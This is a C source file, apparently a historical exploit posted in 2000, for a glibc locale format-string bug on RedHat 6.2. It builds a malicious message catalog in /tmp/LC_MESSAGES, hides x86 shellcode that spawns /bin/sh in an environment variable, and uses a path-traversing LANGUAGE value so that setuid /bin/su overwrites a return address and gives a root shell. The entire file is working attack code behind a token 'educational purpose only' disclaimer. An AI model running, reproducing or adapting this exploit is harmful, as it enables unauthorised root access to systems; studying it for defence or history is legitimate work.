/* exploit for glibc/locale format strings bug.
 * Tested in RedHat 6.2 with kernel 2.2.16.
 * Script kiddies: you should modify this code
 * slightly by yourself. :)
 *
 * Greets: Solar Designer, Jouko Pynnvnen , zenith parsec
 *
 * THIS CODE IS FOR EDUCATIONAL PURPOSE ONLY AND SHOULD NOT BE RUN IN
 * ANY HOST WITHOUT PERMISSION FROM THE SYSTEM ADMINISTRATOR.
 *
 *           by warning3@nsfocus.com (http://www.nsfocus.com)
 *                                     y2k/9/6
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define DEFAULT_OFFSET                  550
#define DEFAULT_ALIGNMENT                 2
#define DEFAULT_RETLOC           0xbfffd250
#define DEFAULT_BUFFER_SIZE            2048
#define DEFAULT_EGG_SIZE               1024
#define NOP                            0x90
#define PATH             "/tmp/LC_MESSAGES"

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}


 main(int argc, char *argv[]) {
  char *buff, *buff1, *ptr, *egg;
  char *env[3];
  long shell_addr,retloc=DEFAULT_RETLOC,tmpaddr;
  int offset=DEFAULT_OFFSET, align=DEFAULT_ALIGNMENT;
  int bsize=DEFAULT_BUFFER_SIZE, eggsize=DEFAULT_EGG_SIZE;
  int i,reth,retl,num=111;
  FILE *fp;

  if (argc > 1) sscanf(argv[1],"%x",&retloc);
  if (argc > 2) offset  = atoi(argv[2]);
  if (argc > 3) num = atoi(argv[3]);
  if (argc > 4) align = atoi(argv[4]);
  if (argc > 5) bsize   = atoi(argv[5]);
  if (argc > 6) eggsize = atoi(argv[6]);



  printf("Usages: %s <RETloc> <offset> <num> <align> <buffsize> <eggsize> \n",argv[0]);

  if (!(buff = malloc(eggsize))) {
       printf("Can't allocate memory.\n");
       exit(0);
    }


  if (!(buff1 = malloc(bsize))) {
       printf("Can't allocate memory.\n");
       exit(0);
    }

  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

    printf("Using RET location address: 0x%x\n", retloc);
    shell_addr = get_esp() + offset;
    printf("Using Shellcode address: 0x%x\n", shell_addr);

    reth = (shell_addr >> 16) & 0xffff ;
    retl = (shell_addr >>  0) & 0xffff ;

    ptr = buff;

    for (i = 0; i <2 ; i++, retloc+=2 ){
       memset(ptr,'A',4);
       ptr += 4 ;
       (*ptr++) =  retloc & 0xff;
       (*ptr++) = (retloc >> 8  ) & 0xff ;
       (*ptr++) = (retloc >> 16 ) & 0xff ;
       (*ptr++) = (retloc >> 24 ) & 0xff ;
      }

     memset(ptr,'A',align);

     ptr = buff1;

     for(i = 0 ; i < num ; i++ )
     {
        memcpy(ptr, "%.8x", 4);
        ptr += 4;
     }

     sprintf(ptr, "%%x%%%uc%%hn%%%uc%%hn",(retl - num*8),
              (0x10000 + reth - retl - 6));


    mkdir(PATH,0755);
    chdir(PATH);
    fp = fopen("libc.po", "w+");
    fprintf(fp,"msgid \"%%s: invalid option -- %%c\\n\"\n");
    fprintf(fp,"msgstr \"%s\\n\"", buff1);
    fclose(fp);
    system("/usr/bin/msgfmt libc.po -o libc.mo");


    ptr = egg;
    for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
      *(ptr++) = NOP;

    for (i = 0; i < strlen(shellcode); i++)
      *(ptr++) = shellcode[i];

    egg[eggsize - 1] = '\0';

    memcpy(egg, "EGG=", 4);
    env[0] = egg ;
    env[1] = "LANGUAGE=sk_SK/../../../../../../tmp";
    env[2] = (char *)0 ;

    execle("/bin/su","su","-u", buff, NULL,env);

}  /* end of main */
/*                   www.hack.co.za  [11 September 2000]*/